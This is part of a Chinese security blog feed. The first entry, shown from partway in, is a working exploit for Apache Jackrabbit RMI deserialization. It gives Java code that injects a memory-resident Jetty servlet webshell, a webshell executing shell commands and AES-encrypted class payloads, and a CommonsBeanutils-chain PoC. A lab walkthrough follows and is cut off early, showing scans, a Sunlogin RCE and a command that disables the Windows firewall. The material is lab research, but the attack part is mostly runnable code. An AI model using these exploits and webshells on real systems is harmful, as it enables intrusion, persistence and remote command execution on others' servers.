RlcjsBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFyhbQkxqYXZhL2xhbmcvU3RyaW5nOylWAQAEaW5pdAEAFyhJTGphdmEvc2VjdXJpdHkvS2V5OylWAQAJZ2V0UmVhZGVyAQAaKClMamF2YS9pby9CdWZmZXJlZFJlYWRlcjsBABZqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyAQAIcmVhZExpbmUBAAdkb0ZpbmFsAQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAOZ2V0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7AQA4KExvcmcvZXhhbXBsZS9TZXJ2bGV0VGVtcGxhdGVzO0xqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KVYBAAFnAQAVKFtCKUxqYXZhL2xhbmcvQ2xhc3M7AQALbmV3SW5zdGFuY2UBABQoKUxqYXZhL2xhbmcvT2JqZWN0OwEAEWdldERlY2xhcmVkTWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAD3ByaW50U3RhY2tUcmFjZQAhAEYARwAAAAAABQABAEoASwABAEwAAAAvAAEAAQAAAAUqtwABsQAAAAIATQAAAAYAAQAAABIATgAAAAwAAQAAAAUATwBQAAAACgBRAFIAAQBMAAAAZQACAAQAAAARKrYAAky4AANNLCu2AAROLbAAAAACAE0AAAASAAQAAAAUAAUAFQAJABYADwAXAE4AAAAqAAQAAAARAFMAVAAAAAUADABVAFYAAQAJAAgAVwBaAAIADwACAFsAVgADAAQAXABdAAIATAAAAogABwAJAAABYLIABRIGtgAHKxIIuQAJAgDGAIorEgi5AAkCABIKtgALmQB6KxIMuQAJAgBOLcYAai22AA2aAGMBOgSyAA4SD7YAC5kAGga9ABBZAxIRU1kEEhJTWQUtUzoEpwAXBr0AEFkDEhNTWQQSFFNZBS1TOgS7ABVZuAAWGQS2ABe2ABi3ABkSGrYAG7YAHDoFLLkAHQEAGQW2AB6nAMgrEh+5ACACAMYAvSu5ACEBABIitgALmQCnEgxOK7kAIwEAEiQtuQAlAwASJrgAJzoEGQQFuwAoWbsAKVm3ACoruQAjAQASJLkAKwIAtgAsEi22AC62AC+2AAISJrcAMLYAMRkEK7kAMgEAtgAzuAA0tgA1OgW7ADZZKiq2ADe2ADi3ADkZBbYAOjoGGQa2ADs6BxkGEjwFvQA9WQMSPlNZBBI/U7YAQDoIGQgZBwW9AEFZAytTWQQsU7YAQlenAAhOLbYARLEAAQClAVcBWgBDAAMATQAAAGYAGQAAABsACAAdACMAHwAsACAANwAhADoAIgBFACMAXAAlAHAAJwCMACgAlwAqAKUALQCzAC4AtgAvAMQAMADLADEA/AAyAQ8AMwElADQBLAA1AUMANgFXADoBWgA4AVsAOQFfADwATgAAAIQADQA6AF0AXgBfAAQAjAALAGAAVAAFACwAawBhAFQAAwC2AKEAYgBUAAMAywCMAGMAZAAEAQ8ASABlAFYABQElADIAZgBnAAYBLAArAGgAaQAHAUMAFABqAGsACAFbAAQAbABtAAMAAAFgAE8AUAAAAAABYABuAG8AAQAAAWAAcABxAAIAcgAAABgAB/0AXAcAcwcAdBP5ACYC+wC8QgcAdQQAdgAAAAQAAQB3AAQAeABdAAIATAAAAEkAAwADAAAAByorLLYARbEAAAACAE0AAAAKAAIAAABAAAYAQQBOAAAAIAADAAAABwBPAFAAAAAAAAcAbgBvAAEAAAAHAHAAcQACAHYAAAAEAAEAdwAJAHkAegABAEwAAAArAAAAAQAAAAGxAAAAAgBNAAAABgABAAAASwBOAAAADAABAAAAAQB7AF8AAAACAHwAAAACAH0ASQAAABIAAgA2AEYASAAAAFgAgABZAAk=&quot;</span>);</span><br><span class="line">            a.invoke(Thread.currentThread().getContextClassLoader(), b, <span class="number">0</span>, b.length);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取上下文</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">GetWebContent</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">Thread</span> <span class="variable">currentThread</span> <span class="operator">=</span> Thread.currentThread();</span><br><span class="line">            <span class="type">Object</span> <span class="variable">contextClassLoader</span> <span class="operator">=</span> GetField(currentThread, <span class="string">&quot;contextClassLoader&quot;</span>);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">_context</span> <span class="operator">=</span> GetField(contextClassLoader,<span class="string">&quot;_context&quot;</span>);</span><br><span class="line">            servletHandler = GetField(_context,<span class="string">&quot;_servletHandler&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title function_">InjectServlet</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span>(servletHandler != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//方法二</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">EvilServlet</span> <span class="operator">=</span> Thread.currentThread().getContextClassLoader().loadClass(filterClassName);</span><br><span class="line">            <span class="type">Method</span> <span class="variable">addFilterWithMapping</span> <span class="operator">=</span> GetMethod(servletHandler, <span class="string">&quot;addServletWithMapping&quot;</span>, Class.class, String.class);</span><br><span class="line">            addFilterWithMapping.invoke(servletHandler, EvilServlet, <span class="string">&quot;/boogipop&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Object <span class="title function_">GetField</span><span class="params">(Object o, String k)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Field f;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            f = o.getClass().getDeclaredField(k);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e1)&#123;</span><br><span class="line">                f = o.getClass().getSuperclass().getSuperclass().getDeclaredField(k);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f.get(o);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">synchronized</span> Method <span class="title function_">GetMethod</span><span class="params">(Object obj, String methodName, Class&lt;?&gt;... paramClazz)</span> <span class="keyword">throws</span> NoSuchMethodException &#123;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> obj.getClass();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(clazz != Object.class) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = clazz.getDeclaredMethod(methodName, paramClazz);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class="line">                clazz = clazz.getSuperclass();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoSuchMethodException</span>(methodName);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> method;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InjectJettyServletShell</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            LoadServlet();</span><br><span class="line">            GetWebContent();</span><br><span class="line">            InjectServlet();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InjectJettyServletShell</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ServletTemplates.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTemplates</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">byte</span>[] BASE64Decoder(String data)&#123;</span><br><span class="line">        <span class="type">byte</span>[] inputBytes = data.getBytes();</span><br><span class="line">        Base64.<span class="type">Decoder</span> <span class="variable">encoder</span> <span class="operator">=</span> Base64.getDecoder();</span><br><span class="line">        <span class="type">byte</span>[] encodedBytes = encoder.decode(inputBytes);</span><br><span class="line">        <span class="keyword">return</span> encodedBytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;[+] Dynamic Servlet says hello&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(request.getParameter(<span class="string">&quot;type&quot;</span>) != <span class="literal">null</span> &amp;&amp; request.getParameter(<span class="string">&quot;type&quot;</span>).equals(<span class="string">&quot;basic&quot;</span>))&#123;</span><br><span class="line">            <span class="comment">//basic cmd shell</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;pass&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span> &amp;&amp; !cmd.isEmpty())&#123;</span><br><span class="line">                String[] cmds = <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span>(File.separator.equals(<span class="string">&quot;/&quot;</span>))&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    cmds = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd&quot;</span>, <span class="string">&quot;/C&quot;</span>, cmd&#125;;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="string">&quot;\\A&quot;</span>).next();</span><br><span class="line">                response.getWriter().println(result);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(request.getHeader(<span class="string">&quot;e45e329feb5d925b&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="comment">//behind3 shell</span></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (request.getMethod().equals(<span class="string">&quot;POST&quot;</span>))&#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">k</span> <span class="operator">=</span> <span class="string">&quot;pass&quot;</span>;</span><br><span class="line">                    request.getSession().setAttribute(<span class="string">&quot;u&quot;</span>,k);</span><br><span class="line">                    <span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);</span><br><span class="line">                    cipher.init(<span class="number">2</span>, <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>((request.getSession().getAttribute(<span class="string">&quot;u&quot;</span>) + <span class="string">&quot;&quot;</span>).getBytes(), <span class="string">&quot;AES&quot;</span>));</span><br><span class="line">                    <span class="type">byte</span>[] evilClassBytes = cipher.doFinal(BASE64Decoder(request.getReader().readLine()));</span><br><span class="line">                    <span class="type">Class</span> <span class="variable">evilClass</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">U</span>(<span class="built_in">this</span>.getClass().getClassLoader()).g(evilClassBytes);</span><br><span class="line">                    <span class="type">Object</span> <span class="variable">evilObject</span> <span class="operator">=</span> evilClass.newInstance();</span><br><span class="line">                    <span class="type">Method</span> <span class="variable">targetMethod</span> <span class="operator">=</span> evilClass.getDeclaredMethod(<span class="string">&quot;equals&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;ServletRequest.class, ServletResponse.class&#125;);</span><br><span class="line">                    targetMethod.invoke(evilObject, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">U</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;</span><br><span class="line">        U(ClassLoader c)&#123;<span class="built_in">super</span>(c);&#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Class <span class="title function_">g</span><span class="params">(<span class="type">byte</span> []b)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(b,<span class="number">0</span>,b.length);&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里先是编译ServletTemplates.java文件   然后转化成base64编码</p><p><img src="../images/image-20231213172248562.png" alt="image-20231213172248562"></p><p>然后使用该脚本将换行服删掉</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">multiline_string = <span class="string">&quot;&quot;&quot;base64编码&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">single_line_string = multiline_string.replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(single_line_string)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>然后替换进InjectJettyServletShell中</p><p><img src="../images/image-20231213172415784.png" alt="image-20231213172415784"></p><p>再将其编译 </p><p>然后写入poc中</p><p><img src="../images/image-20231213172443643.png" alt="image-20231213172443643"></p><p>运行</p><p><img src="../images/image-20231213172507004.png" alt="image-20231213172507004"></p><p>POC</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.commons.JcrUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.jackrabbit.rmi.repository.URLRemoteRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.jcr.Repository;</span><br><span class="line"><span class="keyword">import</span> javax.jcr.SimpleCredentials;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object object,String field_name,Object filed_value)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException &#123;</span><br><span class="line">        Class clazz=object.getClass();</span><br><span class="line">        Field declaredField=clazz.getDeclaredField(field_name);</span><br><span class="line">        declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        declaredField.set(object,filed_value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;1vxyz&quot;</span>);</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea_vip\\IntelliJ IDEA 2022.2.2\\project\\Apache_Jackrabbit_RMI\\target\\classes\\org\\example\\InjectJettyServletShell.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, codes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>();</span><br><span class="line">        <span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line">        queue.add(<span class="number">1</span>);</span><br><span class="line">        queue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        setFieldValue(queue,<span class="string">&quot;queue&quot;</span>,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;templates,templates&#125;);<span class="comment">// 设置BeanComparator.compare()的参数</span></span><br><span class="line">        setFieldValue(comparator,<span class="string">&quot;property&quot;</span>,<span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line">        <span class="type">SimpleCredentials</span> <span class="variable">simpleCredentials</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleCredentials</span>(<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1&quot;</span>.toCharArray());</span><br><span class="line">        simpleCredentials.setAttribute(<span class="string">&quot;a&quot;</span>,queue);</span><br><span class="line">        <span class="type">URLRemoteRepository</span> <span class="variable">repository</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLRemoteRepository</span>(<span class="string">&quot;http://localhost:8080/rmi&quot;</span>);</span><br><span class="line">        repository.login(simpleCredentials);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>利用链子</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">远程调用ServerRipository.login()方法</span><br><span class="line">反序列化SimpleCredentials对象Attribute属性</span><br><span class="line">HashMap.readObject()</span><br><span class="line">CB链</span><br><span class="line"></span><br><span class="line">//其实就是我们先获取到服务端的远程存储库对象   然后调用该对象的login方法来进行登录   然后服务端那边的login方法就会来处理我们的请求  因为我们客户端使用的login方法  需要给服务端这边传两个参数  其中一个就是我们可控的SimpleCredentials类  然后因为其中有个参数是Hashmap对象的 并且可以赋值  服务端又存在cb链依赖  </span><br><span class="line">我们就可以构造恶意的SimpleCredentials类传到服务端 然后服务端就会反序列化我们传入的SimpleCredentials类  这样就造成了RCE</span><br><span class="line"></span><br><span class="line">(其过程是服务端开启了一个RMI服务，客户端调用该服务并发送恶意对象，服务端反序列化恶意对象，触发RCE)</span><br></pre></td></tr></table></figure><p>官方的修复方案就是将CB链的依赖给删除了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考链接&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://xz.aliyun.com/t/13118&quot;&gt;https://xz.aliyun.com/t/13118&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://boogipop.com/2023/10/16/Apa</summary>
      
    
    
    
    
    <category term="Java" scheme="https://ke1nys.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Vulntarget-e</title>
    <link href="https://ke1nys.github.io/posts/524daed3.html"/>
    <id>https://ke1nys.github.io/posts/524daed3.html</id>
    <published>2023-12-11T06:46:48.000Z</published>
    <updated>2024-01-20T15:32:19.406Z</updated>
    
    <content type="html"><![CDATA[<p>从a打到e  我个人感觉e是最好的  可以学到挺多东西的</p><p><img src="../images/image-20231211145027877.png" alt="image-20231211145027877"></p><p>这个是整个靶机所用到的机器  </p><p>靶机外网地址  192.168.52.140</p><p>攻击机地址  192.168.52.129</p><p>先是fscan开扫  但是发现ping失败了   于是就猜测是开启了防火墙  于是只扫端口就行了</p><p>这里使用fscan来扫的话  速度太慢了  于是我们使用nmap的-d参数来扫   这样的话也可以绕过防火墙 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -sC -d 192.168.52.140 -p 1-65535</span><br></pre></td></tr></table></figure><p><img src="../images/image-20231211150133281.png" alt="image-20231211150133281"></p><p>重点是我们发现了这句话   不知道是啥服务这个端口   于是去Google查询了一下  发现是向日葵的一个RCE漏洞</p><p><a href="https://mdnice.com/writing/8a41e22d1d0744bd9e8ab5999d3cfebe">https://mdnice.com/writing/8a41e22d1d0744bd9e8ab5999d3cfebe</a></p><p>直接抓包来打</p><p><img src="../images/image-20231211150459046.png" alt="image-20231211150459046"></p><p>漏洞真实存在  于是开始进行看看能不能上线主机  先收集一下信息  </p><p>(防火墙是开启的   并且是用tasklist来查看  发现是存在wdf的 所以这里的话需要上免杀马  并且关掉防火墙)</p><p><code>netsh advfirewall set allprofiles state off  //关闭防火墙命令</code></p><p><img src="../images/image-20231211151220461.png" 